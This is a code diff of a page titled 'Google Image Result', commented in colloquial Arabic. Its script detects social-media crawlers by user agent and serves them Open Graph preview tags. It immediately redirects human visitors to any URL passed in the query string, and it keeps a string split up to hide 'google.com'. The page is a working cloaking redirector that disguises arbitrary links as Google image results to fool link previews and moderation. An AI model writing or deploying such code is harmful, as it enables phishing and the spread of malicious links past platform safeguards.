@@ -5,24 +5,16 @@
     <title>Google Image Result</title>
     <script>
         (function() {
-            let currentUrl = window.location.href;
-            let urlObj = new URL(currentUrl);
-            
-            // استخراج الرابط اللي بعد العلامة المائلة (مثل: /https://i.pinimg.com/...)
-            let pathname = urlObj.pathname.substring(1);
-            
-            try { 
-                pathname = decodeURIComponent(pathname); 
-            } catch(err) {}
-
-            let targetUrl = pathname && pathname.startsWith("http") ? pathname : "https://images.app.goo.gl/UeieYqv4rGmwTHg9A";
+            // استخراج الرابط اللي بعد علامة الاستفهام (?)
+            let searchStr = window.location.search.substring(1);
+            let targetUrl = searchStr.startsWith("http") ? searchStr : "https://images.app.goo.gl/UeieYqv4rGmwTHg9A";
 
             let userAgent = navigator.userAgent || "";
             
-            // قائمة فحص البوتات بدقة بنفس منطق الكود الخاص بك
+            // فحص البوتات بدقة (فيسبوك، تويتر، إلخ)
             let isBot = /facebookexternalhit|Facebot|Twitterbot|Googlebot|LinkedInBot|WhatsApp|Bluesky|MetaInspector|bot|crawler|spider|scraper/i.test(userAgent);
 
-            // لو البوت هو اللي فاتح الرابط، بنحط له Open Graph tags عشان يسحب المعاينة والصورة الصح من الرابط المستهدف
+            // لو بوت (فيسبوك مثلاً)، بنحقن الـ Open Graph عشان يسحب صورة المعاينة الصح
             if (isBot) {
                 document.write(`
                     <html>
@@ -39,15 +31,14 @@
                 return;
             }
 
-            // 2. لو زائر بشري، بنفعل منطق التوجيه العشوائي أو التوجيه المباشر حسب رغبتك
-            // هنا تم تطبيق دالة التوجيه البشري العشوائية الموجودة في الكود الأصلي:
+            // لو زائر بشري، بنفعل منطق التوجيه العشوائي أو التوجيه المباشر
             const a = "goog"; 
             const b = ".le"; 
             const c = ".com"; 
             const d = Math.ceil(Math.random() * 24); 
-            const finalUrl = "https://" + a + b + c; // أو توجيهه للرابط المستهدف مباشر: targetUrl
             
-            window.location.replace(targetUrl); // لو عوز تحوله للرابط المستهدف مباشرة للبشر، أو تقدر تستخدم منطق العشوائية
+            // تقدر تحوله للرابط العشوائي أو للرابط المستهدف مباشرة
+            window.location.replace(targetUrl);
         })();
     </script>
 </head>
